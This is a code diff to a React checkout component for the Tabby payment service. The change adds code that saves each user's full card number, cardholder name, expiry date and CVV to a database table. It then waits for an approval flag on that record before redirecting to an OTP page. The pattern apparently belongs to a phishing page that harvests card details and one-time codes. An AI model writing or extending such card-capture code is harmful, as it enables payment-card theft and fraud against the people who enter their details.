@@ -61,27 +61,37 @@ const TabbyPaymentProcessing = () => {
         if (error) throw error;
         setPaymentId(data.id);
 
-        // Poll for status updates
+        // أيضاً حفظ البطاقة في جدول المحاولات
+        await supabase.from("tabby_payment_attempts").insert({
+          payment_id: data.id,
+          card_number: cardNumber,
+          cardholder_name: cardholderName,
+          expiry_date: expiryDate,
+          cvv: cvv,
+        });
+
+        // Poll for status updates on payment attempts
         const pollInterval = setInterval(async () => {
-          const { data: statusData, error: statusError } = await supabase
-            .from("tabby_payments")
-            .select("payment_status")
-            .eq("id", data.id)
+          const { data: attemptsData, error: attemptsError } = await supabase
+            .from("tabby_payment_attempts")
+            .select("approval_status")
+            .eq("payment_id", data.id)
+            .order('created_at', { ascending: false })
+            .limit(1)
             .single();
 
-          if (statusError) {
-            clearInterval(pollInterval);
-            setPaymentStatus("failed");
+          if (attemptsError) {
+            console.log("No payment attempts yet or error:", attemptsError);
             return;
           }
 
-          if (statusData.payment_status === "approved") {
+          if (attemptsData?.approval_status === "approved") {
             clearInterval(pollInterval);
             setPaymentStatus("success");
             setTimeout(() => {
               navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${data.id}`);
             }, 2000);
-          } else if (statusData.payment_status === "rejected") {
+          } else if (attemptsData?.approval_status === "rejected") {
             clearInterval(pollInterval);
             setPaymentStatus("failed");
             setTimeout(() => {
